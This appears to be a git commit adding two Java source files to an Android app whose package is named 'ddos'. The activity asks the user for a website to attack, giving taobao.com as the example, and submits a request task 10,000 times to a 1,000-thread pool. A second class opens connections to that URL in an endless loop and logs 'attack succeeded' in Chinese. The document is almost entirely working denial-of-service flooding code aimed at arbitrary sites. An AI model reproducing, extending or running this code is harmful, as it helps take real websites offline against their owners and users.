011f1b7e28b4ab32e89e6b6d5cbc7c100df67343
715686280@qq.com <qq715686280>
2018-05-17 14:00:09 +0800

    fm

---
+++ app/src/main/java/com/dtsj/ddos/DDosActivity.java
@@ -0,0 +1,75 @@
+package com.dtsj.ddos;
+
+import android.support.v7.app.AppCompatActivity;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.Toast;
+
+import java.util.Scanner;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
+public class DDosActivity extends AppCompatActivity implements View.OnClickListener{
+    private EditText urlEdit;
+    private Button startDDos,stopDDos,testDDos,liuDDos;
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_ddos);
+//        getActionBar().hide();
+        initView();
+    }
+
+    private void DDosStart(){
+        Toast.makeText(this,"请输入想要攻击的网址 例如  http://taobao.com",Toast.LENGTH_SHORT).show();
+            ExecutorService es = Executors.newFixedThreadPool(1000);//1000太多了
+            String str=urlEdit.getText().toString();
+            MythreadCus mythread = new MythreadCus(str);
+            Thread thread = new Thread(mythread);
+            for (int i = 0; i < 10000; i++) {
+                es.execute(thread);
+            }
+        }
+
+    private void DDosTest(){
+        Toast.makeText(this,"请输入想要攻击的网址 例如  http://taobao.com",Toast.LENGTH_SHORT).show();
+        String str=urlEdit.getText().toString();
+        TestRu testRu=new TestRu(str);
+        new Thread(testRu).start();
+    }
+
+        private void initView(){
+            testDDos=findViewById(R.id.ddos_test);
+            liuDDos=findViewById(R.id.ddos_liu);
+            urlEdit=findViewById(R.id.ddos_edit);
+            startDDos=findViewById(R.id.ddos_start);
+            stopDDos=findViewById(R.id.ddos_finish);
+            stopDDos.setOnClickListener(this);
+            startDDos.setOnClickListener(this);
+            testDDos.setOnClickListener(this);
+            liuDDos.setOnClickListener(this);
+        }
+
+    @Override
+    public void onClick(View v) {
+        switch (v.getId()){
+            case R.id.ddos_start:
+                DDosStart();
+                break;
+
+            case R.id.ddos_finish:
+                finish();
+                break;
+
+            case R.id.ddos_test:
+                DDosTest();
+                break;
+
+            case R.id.ddos_liu:
+                finish();
+                break;
+        }
+    }
+}
---
+++ app/src/main/java/com/dtsj/ddos/TestRu.java
@@ -0,0 +1,44 @@
+package com.dtsj.ddos;
+
+import android.util.Log;
+
+import java.io.BufferedInputStream;
+import java.io.IOException;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLConnection;
+
+public class TestRu implements Runnable {
+    private String urlH;
+    public TestRu(String urlH){
+        this.urlH=urlH;
+    }
+
+    @Override
+    public void run() {
+        while (true) {
+            try {
+                URL url = new URL(urlH);
+                URLConnection conn = url.openConnection();
+                BufferedInputStream bis = new BufferedInputStream(
+                        conn.getInputStream());
+                byte[] bytes = new byte[1024];
+                int len = -1;
+                StringBuffer sb = new StringBuffer();
+                if (bis != null) {
+                    if ((len = bis.read()) != -1) {
+                        sb.append(new String(bytes, 0, len));
+                        //System.out.println("attackMASTER");
+                        Log.e("sunder", "攻击成功");
+                        bis.close();
+                    }
+                }
+            } catch (MalformedURLException e) {
+                e.printStackTrace();
+            } catch (IOException e) {
+
+                e.printStackTrace();
+            }
+        }
+    }
+}
